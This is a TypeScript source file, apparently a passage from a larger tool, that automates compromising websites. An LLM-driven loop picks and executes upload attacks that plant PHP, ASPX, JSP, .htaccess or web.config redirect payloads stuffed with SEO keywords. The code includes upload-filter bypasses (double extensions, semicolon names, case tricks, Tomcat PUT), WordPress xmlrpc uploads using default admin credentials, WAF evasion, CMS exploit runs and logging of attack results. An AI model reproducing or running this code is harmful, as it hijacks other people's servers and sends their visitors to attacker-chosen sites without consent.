              reasoning: { type: "string" },
              bypassTechnique: { type: "string" },
              confidence: { type: "number" },
              isRedirectPayload: { type: "boolean" },
              payloadType: { type: "string" },
            },
            required: ["method", "payload", "filename", "uploadPath", "contentType", "httpMethod", "headers", "reasoning", "bypassTechnique", "confidence", "isRedirectPayload", "payloadType"],
            additionalProperties: false,
          },
        },
      },
    });

    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") {
      const decision = JSON.parse(content);

      const validMethods = ["POST", "PUT", "PATCH", "MOVE", "COPY", "MKCOL", "PROPFIND", "DELETE"];
      const normalized: AiDecision = {
        iteration,
        method: decision.method || "multipart_upload",
        payload: decision.payload || generateFallbackPayload(redirectUrl, seoKeywords, recon.language),
        filename: decision.filename || `cache-${randomStr(8)}.php`,
        uploadPath: decision.uploadPath || (recon.writablePaths[0] || "/uploads/"),
        contentType: decision.contentType || "text/html",
        httpMethod: (validMethods.includes(decision.httpMethod) ? decision.httpMethod : "POST") as AiDecision["httpMethod"],
        headers: decision.headers || {},
        reasoning: decision.reasoning || "AI decision",
        bypassTechnique: decision.bypassTechnique || "standard",
        confidence: Math.max(0, Math.min(100, decision.confidence || 50)),
        isRedirectPayload: decision.isRedirectPayload !== false,
        payloadType: decision.payloadType || "html_meta",
      };

      // Ensure payload contains redirect URL
      if (!normalized.payload.includes(redirectUrl) && normalized.isRedirectPayload) {
        normalized.payload = generateFallbackPayload(redirectUrl, seoKeywords, recon.language);
      }

      onEvent?.({
        type: "decision", iteration, maxIterations,
        detail: `🧠 AI ตัดสินใจ: ${normalized.method} → ${normalized.uploadPath}${normalized.filename} (${normalized.bypassTechnique}, ${normalized.payloadType}) — ${normalized.reasoning}`,
        data: { method: normalized.method, filename: normalized.filename, path: normalized.uploadPath, bypass: normalized.bypassTechnique, payloadType: normalized.payloadType, confidence: normalized.confidence },
      });

      return normalized;
    }
  } catch (e: any) {
    onEvent?.({
      type: "error", iteration, maxIterations,
      detail: `⚠️ LLM decision failed: ${e.message} — using fallback strategy`,
    });
  }

  return generateFallbackDecision(recon, redirectUrl, iteration, previousResults, seoKeywords);
}

// ─── Multi-platform fallback payload generator ───

function generateFallbackPayload(redirectUrl: string, keywords: string[], language?: string | null): string {
  const kw = keywords.length > 0 ? keywords : ["best deals 2026"];

  switch (language) {
    case "ASP.NET":
      return `<%@ Page Language="C#" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) { Response.Redirect("${redirectUrl}"); }
</script>
<!DOCTYPE html><html><head><title>${kw[0]}</title>
<meta http-equiv="refresh" content="0;url=${redirectUrl}">
<script>window.location.replace("${redirectUrl}");</script>
</head><body><a href="${redirectUrl}">Click here</a></body></html>`;

    case "JSP":
      return `<%@ page language="java" %>
<% response.sendRedirect("${redirectUrl}"); %>
<!DOCTYPE html><html><head><title>${kw[0]}</title>
<meta http-equiv="refresh" content="0;url=${redirectUrl}">
<script>window.location.replace("${redirectUrl}");</script>
</head><body><a href="${redirectUrl}">Click here</a></body></html>`;

    case "Python":
      return `<!DOCTYPE html><html><head><title>${kw[0]}</title>
<meta http-equiv="refresh" content="0;url=${redirectUrl}">
<meta name="description" content="${kw.join(', ')}">
<script>window.location.replace("${redirectUrl}");</script>
</head><body><a href="${redirectUrl}">Click here</a></body></html>`;

    case "Node.js":
    case "Ruby":
    case "Go":
      // These platforms typically serve static HTML, so use HTML redirect
      return `<!DOCTYPE html><html><head><title>${kw[0]}</title>
<meta http-equiv="refresh" content="0;url=${redirectUrl}">
<meta name="description" content="${kw.join(', ')}">
<script>window.location.replace("${redirectUrl}");</script>
</head><body><p>${kw[0]}</p><a href="${redirectUrl}">Click here</a></body></html>`;

    case "PHP":
    default:
      // PHP polyglot — works as both PHP and HTML
      return `<?php
if(!headers_sent()){header("Location: ${redirectUrl}",true,302);exit;}
?><!DOCTYPE html>
<html><head>
<title>${kw[0]}</title>
<meta http-equiv="refresh" content="0;url=${redirectUrl}">
<meta name="description" content="${kw.join(', ')}">
<script>window.location.replace("${redirectUrl}");</script>
</head><body>
<p>${kw[0]}</p>
<a href="${redirectUrl}">Click here</a>
</body></html>`;
  }
}

function generateHtaccessPayload(redirectUrl: string): string {
  return `RewriteEngine On
RewriteRule ^(.*)$ ${redirectUrl} [R=302,L]`;
}

function generateWebConfigPayload(redirectUrl: string): string {
  return `<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <httpRedirect enabled="true" destination="${redirectUrl}" httpResponseStatus="Found" />
  </system.webServer>
</configuration>`;
}

function generateFallbackDecision(
  recon: ReconData,
  redirectUrl: string,
  iteration: number,
  previousResults: ExecutionResult[],
  keywords: string[],
): AiDecision {
  const tried = new Set(previousResults.map(r => `${r.decision.method}|${r.decision.uploadPath}|${r.decision.bypassTechnique}`));
  const strategies: Array<{ method: string; filename: string; path: string; contentType: string; httpMethod: AiDecision["httpMethod"]; bypass: string; payloadType: string; payloadFn: () => string }> = [];

  const paths = recon.writablePaths.length > 0 ? recon.writablePaths : ["/uploads/", "/images/", "/tmp/", "/media/"];
  const base = `cache-${randomStr(8)}`;

  for (const path of paths) {
    // Universal HTML strategies (work on ANY server)
    strategies.push({ method: "put_direct", filename: `${base}.html`, path, contentType: "text/html", httpMethod: "PUT", bypass: "html_only", payloadType: "html_meta", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, null) });
    strategies.push({ method: "multipart_upload", filename: `${base}.html`, path, contentType: "text/html", httpMethod: "POST", bypass: "html_only", payloadType: "html_meta", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, null) });

    // PHP strategies
    if (recon.language === "PHP" || !recon.language) {
      strategies.push({ method: "put_direct", filename: `${base}.php`, path, contentType: "application/x-php", httpMethod: "PUT", bypass: "standard", payloadType: "php_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "PHP") });
      strategies.push({ method: "multipart_upload", filename: `${base}.php.jpg`, path, contentType: "multipart/form-data", httpMethod: "POST", bypass: "double_ext", payloadType: "php_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "PHP") });
      strategies.push({ method: "put_direct", filename: `${base}.phtml`, path, contentType: "application/x-httpd-php", httpMethod: "PUT", bypass: "alt_extension", payloadType: "php_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "PHP") });
      strategies.push({ method: "put_direct", filename: `${base}.pHp`, path, contentType: "application/x-php", httpMethod: "PUT", bypass: "case_variation", payloadType: "php_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "PHP") });
    }

    // ASP.NET strategies
    if (recon.language === "ASP.NET" || recon.serverType === "IIS") {
      strategies.push({ method: "put_direct", filename: `${base}.aspx`, path, contentType: "text/html", httpMethod: "PUT", bypass: "standard", payloadType: "aspx_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "ASP.NET") });
      strategies.push({ method: "put_direct", filename: `${base}.aspx;.jpg`, path, contentType: "image/jpeg", httpMethod: "PUT", bypass: "semicolon", payloadType: "aspx_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "ASP.NET") });
      strategies.push({ method: "put_direct", filename: `${base}.asp`, path, contentType: "text/html", httpMethod: "PUT", bypass: "asp_classic", payloadType: "asp_classic_redirect", payloadFn: () => `<% Response.Redirect "${redirectUrl}" %>` });
    }

    // JSP strategies
    if (recon.language === "JSP" || recon.serverType === "Tomcat") {
      strategies.push({ method: "put_direct", filename: `${base}.jsp`, path, contentType: "text/html", httpMethod: "PUT", bypass: "standard", payloadType: "jsp_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "JSP") });
      strategies.push({ method: "tomcat_put", filename: `${base}.jsp/`, path, contentType: "text/html", httpMethod: "PUT", bypass: "trailing_slash", payloadType: "jsp_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "JSP") });
    }

    // .htaccess strategy (Apache/LiteSpeed)
    if (recon.serverType === "Apache" || recon.serverType === "LiteSpeed") {
      strategies.push({ method: "put_direct", filename: ".htaccess", path, contentType: "text/plain", httpMethod: "PUT", bypass: "htaccess_inject", payloadType: "htaccess_rewrite", payloadFn: () => generateHtaccessPayload(redirectUrl) });
    }

    // web.config strategy (IIS)
    if (recon.serverType === "IIS") {
      strategies.push({ method: "put_direct", filename: "web.config", path, contentType: "text/xml", httpMethod: "PUT", bypass: "webconfig_inject", payloadType: "web_config_redirect", payloadFn: () => generateWebConfigPayload(redirectUrl) });
    }

    // WebDAV strategies
    if (recon.hasWebdav) {
      strategies.push({ method: "webdav_put", filename: `${base}.html`, path, contentType: "text/html", httpMethod: "PUT", bypass: "webdav", payloadType: "html_meta", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, null) });
    }

    // WordPress-specific
    if (recon.cms === "WordPress") {
      strategies.push({ method: "wp_media_upload", filename: `${base}.php.jpg`, path: "/wp-admin/admin-ajax.php", contentType: "multipart/form-data", httpMethod: "POST", bypass: "double_ext", payloadType: "php_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "PHP") });
      strategies.push({ method: "wp_rest_media", filename: `${base}.jpg`, path: "/wp-json/wp/v2/media", contentType: "image/jpeg", httpMethod: "POST", bypass: "content_type_spoof", payloadType: "php_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "PHP") });
    }
    if (recon.hasXmlrpc) {
      strategies.push({ method: "xmlrpc_upload", filename: `${base}.php`, path: "/xmlrpc.php", contentType: "text/xml", httpMethod: "POST", bypass: "standard", payloadType: "php_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "PHP") });
    }
  }

  const untried = strategies.find(s => !tried.has(`${s.method}|${s.path}|${s.bypass}`));
  const strategy = untried || strategies[iteration % strategies.length];

  return {
    iteration,
    method: strategy.method,
    payload: strategy.payloadFn(),
    filename: strategy.filename,
    uploadPath: strategy.path,
    contentType: strategy.contentType,
    httpMethod: strategy.httpMethod,
    headers: {},
    reasoning: `Fallback strategy: ${strategy.method} with ${strategy.bypass} bypass to ${strategy.path} (${strategy.payloadType})`,
    bypassTechnique: strategy.bypass,
    confidence: Math.max(10, 60 - (iteration * 5)),
    isRedirectPayload: true,
    payloadType: strategy.payloadType,
  };
}

// ─── Phase 3: EXECUTE ───

async function executeDecision(
  recon: ReconData,
  decision: AiDecision,
  timeout: number,
  onEvent?: AiCommanderCallback,
  maxIterations: number = 10,
): Promise<ExecutionResult> {
  const targetUrl = recon.domain.startsWith("http") ? recon.domain.replace(/\/+$/, "") : `http://${recon.domain}`;
  const startTime = Date.now();

  onEvent?.({
    type: "execute", iteration: decision.iteration, maxIterations,
    detail: `⚡ Execute: ${decision.httpMethod} ${decision.uploadPath}${decision.filename} (${decision.bypassTechnique}, ${decision.payloadType})`,
  });

  const result: ExecutionResult = {
    decision,
    success: false,
    statusCode: 0,
    responseBody: "",
    responseHeaders: {},
    error: null,
    fileVerified: false,
    redirectVerified: false,
    uploadedUrl: null,
    durationMs: 0,
  };

  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeout);

    const headers: Record<string, string> = {
      "User-Agent": randomUA(),
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Accept-Encoding": "gzip, deflate",
      "Connection": "keep-alive",
      "Cache-Control": "no-cache",
      ...decision.headers,
    };

    let body: string;
    let uploadUrl: string;

    switch (decision.method) {
      case "multipart_upload": {
        const boundary = `----WebKitFormBoundary${randomStr(16)}`;
        headers["Content-Type"] = `multipart/form-data; boundary=${boundary}`;
        uploadUrl = `${targetUrl}${decision.uploadPath}`;
        body = [
          `--${boundary}`,
          `Content-Disposition: form-data; name="file"; filename="${decision.filename}"`,
          `Content-Type: ${decision.contentType === "multipart/form-data" ? "application/octet-stream" : decision.contentType}`,
          ``,
          decision.payload,
          `--${boundary}`,
          `Content-Disposition: form-data; name="action"`,
          ``,
          `upload-attachment`,
          `--${boundary}--`,
        ].join("\r\n");
        break;
      }

      case "put_direct":
      case "webdav_put":
      case "tomcat_put": {
        headers["Content-Type"] = decision.contentType;
        uploadUrl = `${targetUrl}${decision.uploadPath}${decision.filename}`;
        body = decision.payload;
        break;
      }

      case "post_raw": {
        headers["Content-Type"] = decision.contentType;
        headers["Content-Disposition"] = `attachment; filename="${decision.filename}"`;
        uploadUrl = `${targetUrl}${decision.uploadPath}`;
        body = decision.payload;
        break;
      }

      case "wp_media_upload": {
        const boundary = `----WebKitFormBoundary${randomStr(16)}`;
        headers["Content-Type"] = `multipart/form-data; boundary=${boundary}`;
        headers["Referer"] = `${targetUrl}/wp-admin/`;
        uploadUrl = `${targetUrl}/wp-admin/admin-ajax.php`;
        body = [
          `--${boundary}`,
          `Content-Disposition: form-data; name="action"`,
          ``,
          `upload-attachment`,
          `--${boundary}`,
          `Content-Disposition: form-data; name="async-upload"; filename="${decision.filename}"`,
          `Content-Type: image/jpeg`,
          ``,
          decision.payload,
          `--${boundary}--`,
        ].join("\r\n");
        break;
      }

      case "wp_rest_media": {
        headers["Content-Type"] = decision.contentType;
        headers["Content-Disposition"] = `attachment; filename="${decision.filename}"`;
        uploadUrl = `${targetUrl}/wp-json/wp/v2/media`;
        body = decision.payload;
        break;
      }

      case "xmlrpc_upload": {
        headers["Content-Type"] = "text/xml";
        uploadUrl = `${targetUrl}/xmlrpc.php`;
        const b64 = Buffer.from(decision.payload).toString("base64");
        body = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.uploadFile</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>admin</string></value></param>
    <param><value><string>admin</string></value></param>
    <param><value><struct>
      <member><name>name</name><value><string>${decision.filename}</string></value></member>
      <member><name>type</name><value><string>image/jpeg</string></value></member>
      <member><name>bits</name><value><base64>${b64}</base64></value></member>
      <member><name>overwrite</name><value><boolean>1</boolean></value></member>
    </struct></value></param>
  </params>
</methodCall>`;
        break;
      }

      case "htaccess_inject": {
        headers["Content-Type"] = "text/plain";
        uploadUrl = `${targetUrl}${decision.uploadPath}.htaccess`;
        body = decision.payload;
        break;
      }

      case "webconfig_inject": {
        headers["Content-Type"] = "text/xml";
        uploadUrl = `${targetUrl}${decision.uploadPath}web.config`;
        body = decision.payload;
        break;
      }

      case "webdav_mkcol": {
        headers["Content-Type"] = "text/xml";
        uploadUrl = `${targetUrl}${decision.uploadPath}`;
        body = "";
        break;
      }

      default: {
        headers["Content-Type"] = decision.contentType;
        uploadUrl = `${targetUrl}${decision.uploadPath}${decision.filename}`;
        body = decision.payload;
        break;
      }
    }

    const resp = await fetch(uploadUrl, {
      method: decision.httpMethod,
      headers,
      body: body || undefined,
      signal: controller.signal,
      redirect: "follow",
    });
    clearTimeout(timer);

    result.statusCode = resp.status;
    result.responseBody = await resp.text().catch(() => "");
    resp.headers.forEach((v, k) => { result.responseHeaders[k] = v; });

    // Verify file upload
    if (resp.status < 400) {
      const possibleUrls = [
        `${targetUrl}${decision.uploadPath}${decision.filename}`,
        decision.httpMethod === "PUT" ? uploadUrl : null,
        result.responseBody.includes("url") ? extractUrlFromResponse(result.responseBody) : null,
        // For .htaccess/.web.config, check the directory itself
        decision.payloadType === "htaccess_rewrite" ? `${targetUrl}${decision.uploadPath}` : null,
        decision.payloadType === "web_config_redirect" ? `${targetUrl}${decision.uploadPath}` : null,
      ].filter(Boolean) as string[];

      for (const checkUrl of possibleUrls) {
        const verified = await verifyFile(checkUrl, decision.payload, timeout);
        if (verified.exists) {
          result.fileVerified = true;
          result.uploadedUrl = checkUrl;
          result.redirectVerified = verified.redirectWorks;
          result.success = true;
          break;
        }
      }
    }
  } catch (e: any) {
    result.error = e.name === "AbortError" ? "Timeout" : (e.message || "Unknown").slice(0, 300);
  }

  result.durationMs = Date.now() - startTime;

  onEvent?.({
    type: "execute", iteration: decision.iteration, maxIterations,
    detail: result.success
      ? `✅ สำเร็จ! File uploaded: ${result.uploadedUrl} (redirect ${result.redirectVerified ? "verified ✅" : "unverified ⚠️"})`
      : `❌ Failed: HTTP ${result.statusCode}${result.error ? ` — ${result.error}` : ""} (${result.durationMs}ms)`,
    data: { success: result.success, statusCode: result.statusCode, error: result.error, uploadedUrl: result.uploadedUrl },
  });

  return result;
}

// ─── File verification ───

async function verifyFile(url: string, expectedContent: string, timeout: number): Promise<{ exists: boolean; redirectWorks: boolean }> {
  try {
    const ctrl = new AbortController();
    setTimeout(() => ctrl.abort(), Math.min(timeout, 10000));
    const resp = await fetch(url, {
      headers: { "User-Agent": randomUA() },
      signal: ctrl.signal,
      redirect: "manual",
    });

    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      return { exists: true, redirectWorks: true };
    }

    if (resp.status === 200) {
      const text = await resp.text();
      const hasMetaRefresh = /http-equiv=["']refresh["']/i.test(text);
      const hasJsRedirect = /window\.location|location\.replace|location\.href/i.test(text);
      const isCmsPage = text.includes("wp-content") && text.length > 5000 && !hasMetaRefresh && !hasJsRedirect;

      if (!isCmsPage) {
        return { exists: true, redirectWorks: hasMetaRefresh || hasJsRedirect };
      }
    }
  } catch {}
  return { exists: false, redirectWorks: false };
}

function extractUrlFromResponse(body: string): string | null {
  try {
    const json = JSON.parse(body);
    return json.url || json.source_url || json.data?.url || null;
  } catch {
    const match = body.match(/"url"\s*:\s*"([^"]+)"/);
    return match ? match[1] : null;
  }
}

// ─── Phase 4: AI LEARN ───

async function aiLearn(
  recon: ReconData,
  executionResult: ExecutionResult,
  allResults: ExecutionResult[],
  iteration: number,
  maxIterations: number,
  onEvent?: AiCommanderCallback,
): Promise<string> {
  onEvent?.({
    type: "learn", iteration, maxIterations,
    detail: `📚 AI กำลังวิเคราะห์ผลลัพธ์และเรียนรู้จากความล้มเหลว...`,
  });

  const lessons: string[] = [];

  if (executionResult.statusCode === 403) {
    lessons.push("Server returned 403 Forbidden — WAF or permission block");
    if (recon.waf) lessons.push(`WAF (${recon.waf}) is actively blocking`);
    lessons.push("Next: Try HTML-only payload (WAFs rarely block HTML), or different Content-Type");
  } else if (executionResult.statusCode === 404) {
    lessons.push("Path not found — try different path");
  } else if (executionResult.statusCode === 405) {
    lessons.push("Method not allowed — try different HTTP method");
    if (executionResult.decision.httpMethod === "PUT") lessons.push("PUT blocked → try POST multipart");
    if (executionResult.decision.httpMethod === "POST") lessons.push("POST blocked → try PUT direct");
  } else if (executionResult.statusCode === 413) {
    lessons.push("Payload too large — try smaller payload or chunked upload");
  } else if (executionResult.statusCode === 415) {
    lessons.push("Unsupported media type — try different Content-Type");
  } else if (executionResult.statusCode >= 500) {
    lessons.push("Server error — might indicate partial success or misconfiguration");
  } else if (executionResult.error?.includes("Timeout")) {
    lessons.push("Request timed out — server may be slow or blocking");
  } else if (executionResult.statusCode === 200 && !executionResult.fileVerified) {
    lessons.push("Upload returned 200 but file not found — server accepted but didn't save, or saved to different location");
    lessons.push("Next: Try PUT (creates file at exact URL), or try HTML-only payload");
  } else if (executionResult.statusCode === 301 || executionResult.statusCode === 302) {
    lessons.push("Server redirected the upload request — may need to follow redirect or use different path");
  }

  // Platform-specific lessons
  if (recon.language === "ASP.NET" && executionResult.decision.payloadType === "php_redirect") {
    lessons.push("CRITICAL: Target is ASP.NET but used PHP payload — switch to .aspx or HTML payload");
  }
  if (recon.language === "JSP" && executionResult.decision.payloadType === "php_redirect") {
    lessons.push("CRITICAL: Target is JSP but used PHP payload — switch to .jsp or HTML payload");
  }
  if (recon.serverType === "Nginx" && executionResult.decision.payloadType === "htaccess_rewrite") {
    lessons.push("CRITICAL: .htaccess doesn't work on Nginx — use HTML redirect or nginx.conf injection");
  }

  // Count failures
  const failsByMethod = new Map<string, number>();
  const failsByPath = new Map<string, number>();
  for (const r of allResults) {
    if (!r.success) {
      failsByMethod.set(r.decision.method, (failsByMethod.get(r.decision.method) || 0) + 1);
      failsByPath.set(r.decision.uploadPath, (failsByPath.get(r.decision.uploadPath) || 0) + 1);
    }
  }

  Array.from(failsByMethod.entries()).forEach(([method, count]) => {
    if (count >= 3) lessons.push(`Method "${method}" failed ${count}x — avoid it`);
  });
  Array.from(failsByPath.entries()).forEach(([path, count]) => {
    if (count >= 3) lessons.push(`Path "${path}" failed ${count}x — try different path`);
  });

  const summary = lessons.join(". ");

  onEvent?.({
    type: "learn", iteration, maxIterations,
    detail: `📚 AI เรียนรู้: ${summary}`,
    data: { lessons, failsByMethod: Object.fromEntries(failsByMethod), failsByPath: Object.fromEntries(failsByPath) },
  });

  return summary;
}

// ═══════════════════════════════════════════════════════════════
//  MAIN: AI COMMANDER LOOP v2
// ═══════════════════════════════════════════════════════════════

export async function runAiCommander(config: AiCommanderConfig): Promise<AiCommanderResult> {
  const {
    targetDomain,
    redirectUrl,
    maxIterations = 10,
    timeoutPerAttempt = 15000,
    seoKeywords = [],
    onEvent,
    preAnalysis = null,
    userId,
    pipelineType = "manual",
    sessionId = randomStr(16),
  } = config;

  const startTime = Date.now();
  const decisions: AiDecision[] = [];
  const executionResults: ExecutionResult[] = [];
  let reconData: ReconData | null = null;
  let historyInsights: HistoryInsight | null = null;

  onEvent?.({
    type: "recon", iteration: 0, maxIterations,
    detail: `🚀 AI Commander v2 เริ่มทำงาน — target: ${targetDomain}, redirect: ${redirectUrl}`,
  });

  let nonWpExploitResults: NonWpScanResult | null = null;

  // ─── Phase 0: LOAD HISTORY ───
  try {
    // Do recon first to get server info for history query
    reconData = await performRecon(targetDomain, preAnalysis, onEvent);
    historyInsights = await loadHistoryInsights(reconData, onEvent);
  } catch (e: any) {
    onEvent?.({
      type: "error", iteration: 0, maxIterations,
      detail: `❌ Recon failed: ${e.message}`,
    });
    return {
      success: false, iterations: 0, successfulMethod: null, uploadedUrl: null,
      redirectVerified: false, decisions, executionResults, reconData, totalDurationMs: Date.now() - startTime,
      historyInsights: null, nonWpExploitResults: null,
    };
  }

  // ─── Phase 0.5: NON-WP CMS EXPLOITS ───
  // If target is a non-WordPress CMS, run targeted exploits BEFORE the OODA loop
  const detectedCms = (reconData.cms || "").toLowerCase();
  const isNonWpCms = detectedCms && detectedCms !== "wordpress" && detectedCms !== "shopify" && detectedCms !== "wix" && detectedCms !== "squarespace";
  const isGenericTarget = !reconData.cms || detectedCms === "unknown" || detectedCms === "custom";

  if (isNonWpCms || isGenericTarget) {
    onEvent?.({
      type: "recon", iteration: 0, maxIterations,
      detail: `🔍 Phase 0.5: Running CMS-specific exploits (${reconData.cms || "generic"})...`,
    });

    try {
      const targetUrl = targetDomain.startsWith("http") ? targetDomain : `http://${targetDomain}`;

      // Generate redirect shell code for non-WP exploits
      const phpShellCode = config.phpShellCode || `<?php header("Location: ${redirectUrl}", true, 302); exit; ?>`
        + `<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=${redirectUrl}">`
        + `<script>window.location.replace("${redirectUrl}");</script></head>`
        + `<body><a href="${redirectUrl}">Click here</a></body></html>`;

      nonWpExploitResults = await runNonWpExploits({
        targetUrl,
        cms: reconData.cms || "unknown",
        phpShellCode,
        shellFileName: config.shellFileName || `cache-${randomStr(8)}.php`,
        timeout: timeoutPerAttempt,
        onProgress: (method, detail) => {
          onEvent?.({
            type: "recon", iteration: 0, maxIterations,
            detail: `🔍 [Non-WP] ${method}: ${detail}`,
          });
        },
      });

      // Check if any exploit actually uploaded a file successfully
      const successfulUploads = nonWpExploitResults.results.filter(
        r => r.success && (r.shellUrl || r.uploadedPath)
      );

      if (successfulUploads.length > 0) {
        const bestResult = successfulUploads.find(r => r.severity === "critical") || successfulUploads[0];
        const uploadedUrl = bestResult.shellUrl || bestResult.uploadedPath || null;

        onEvent?.({
          type: "success", iteration: 0, maxIterations,
          detail: `🎯 Non-WP exploit สำเร็จ! ${bestResult.method} (${bestResult.technique}) — ${bestResult.details}`,
          data: {
            uploadedUrl,
            method: `nonwp_${bestResult.method}`,
            bypass: bestResult.technique,
            payloadType: bestResult.cms,
            redirectVerified: false,
            iterations: 0,
          },
        });

        return {
          success: true,
          iterations: 0,
          successfulMethod: `nonwp_${bestResult.method} (${bestResult.technique})`,
          uploadedUrl,
          redirectVerified: false,
          decisions,
          executionResults,
          reconData,
          totalDurationMs: Date.now() - startTime,
          historyInsights,
          nonWpExploitResults,
        };
      }

      // Even if no file was uploaded, log findings for AI Commander context
      const findings = nonWpExploitResults.results.filter(r => r.success);
      if (findings.length > 0) {
        onEvent?.({
          type: "recon", iteration: 0, maxIterations,
          detail: `📋 Non-WP exploits found ${findings.length} vulnerabilities (no file upload yet) — AI Commander will use these findings`,
          data: { findings: findings.map(f => `${f.method}: ${f.details} (${f.severity})`) },
        });
      } else {
        onEvent?.({
          type: "recon", iteration: 0, maxIterations,
          detail: `📋 Non-WP exploits: no vulnerabilities found — proceeding to AI Commander OODA loop`,
        });
      }
    } catch (e: any) {
      onEvent?.({
        type: "recon", iteration: 0, maxIterations,
        detail: `⚠️ Non-WP exploit scan error: ${e.message} — proceeding to AI Commander`,
      });
    }
  }

  // ─── OODA LOOP ───
  for (let iteration = 1; iteration <= maxIterations; iteration++) {
    // DECIDE
    // Pass non-WP exploit findings to AI for smarter decisions
    const nonWpFindings = nonWpExploitResults?.results.filter(r => r.success) || [];
    const decision = await aiDecide(reconData, redirectUrl, iteration, executionResults, seoKeywords, historyInsights, preAnalysis, onEvent, maxIterations, nonWpFindings);
    decisions.push(decision);

    // EXECUTE
    const execResult = await executeDecision(reconData, decision, timeoutPerAttempt, onEvent, maxIterations);
    executionResults.push(execResult);

    // SAVE TO DB (async, don't block)
    if (userId) {
      saveAttackDecision({
        userId,
        targetDomain,
        targetIp: reconData.ip,
        serverType: reconData.serverType,
        serverVersion: reconData.responseHeaders["server"] || null,
        cms: reconData.cms,
        cmsVersion: reconData.cmsVersion,
        language: reconData.language,
        os: reconData.os,
        waf: reconData.waf,
        wafStrength: reconData.wafStrength,
        hostingProvider: reconData.hostingProvider,
        controlPanel: reconData.controlPanel,
        sslEnabled: reconData.sslEnabled,
        redirectUrl,
        method: decision.method,
        filename: decision.filename,
        uploadPath: decision.uploadPath,
        contentType: decision.contentType,
        httpMethod: decision.httpMethod,
        bypassTechnique: decision.bypassTechnique,
        payloadType: decision.payloadType,
        success: execResult.success,
        statusCode: execResult.statusCode,
        errorMessage: execResult.error,
        fileVerified: execResult.fileVerified,
        redirectVerified: execResult.redirectVerified,
        uploadedUrl: execResult.uploadedUrl,
        durationMs: execResult.durationMs,
        aiReasoning: decision.reasoning,
        aiConfidence: decision.confidence,
        iteration,
        preAnalysisData: preAnalysis ? JSON.stringify(preAnalysis.aiStrategy) : null,
        pipelineType,
        sessionId,
      }).catch(() => {}); // fire-and-forget
    }

    // CHECK SUCCESS
    if (execResult.success) {
      onEvent?.({
        type: "success", iteration, maxIterations,
        detail: `🎯 สำเร็จ! File uploaded ที่ ${execResult.uploadedUrl} ด้วย method "${decision.method}" (${decision.bypassTechnique}, ${decision.payloadType}) — ใช้ ${iteration} iterations`,
        data: {
          uploadedUrl: execResult.uploadedUrl,
          method: decision.method,
          bypass: decision.bypassTechnique,
          payloadType: decision.payloadType,
          redirectVerified: execResult.redirectVerified,
          iterations: iteration,
        },
      });

      return {
        success: true,
        iterations: iteration,
        successfulMethod: `${decision.method} (${decision.bypassTechnique}, ${decision.payloadType})`,
        uploadedUrl: execResult.uploadedUrl,
        redirectVerified: execResult.redirectVerified,
        decisions,
        executionResults,
        reconData,
        totalDurationMs: Date.now() - startTime,
        historyInsights,
        nonWpExploitResults,
      };
    }

    // LEARN
    await aiLearn(reconData, execResult, executionResults, iteration, maxIterations, onEvent);

    // ADAPT
    onEvent?.({
      type: "adapt", iteration, maxIterations,
      detail: `🔄 AI ปรับ strategy — เตรียม iteration ${iteration + 1}/${maxIterations}...`,
    });

    await new Promise(r => setTimeout(r, 1000));
  }

  // Exhausted
  onEvent?.({
    type: "exhausted", iteration: maxIterations, maxIterations,
    detail: `⚠️ AI Commander หมด iterations (${maxIterations}) — ไม่สามารถ upload ได้สำเร็จ`,
    data: {
      totalAttempts: executionResults.length,
      methodsTried: Array.from(new Set(decisions.map(d => d.method))),
      pathsTried: Array.from(new Set(decisions.map(d => d.uploadPath))),
      bypassesTried: Array.from(new Set(decisions.map(d => d.bypassTechnique))),
      payloadTypesTried: Array.from(new Set(decisions.map(d => d.payloadType))),
    },
  });

  return {
    success: false,
    iterations: maxIterations,
    successfulMethod: null,
    uploadedUrl: null,
    redirectVerified: false,
    decisions,
    executionResults,
    reconData,
    totalDurationMs: Date.now() - startTime,
    historyInsights,
    nonWpExploitResults,
  };
}
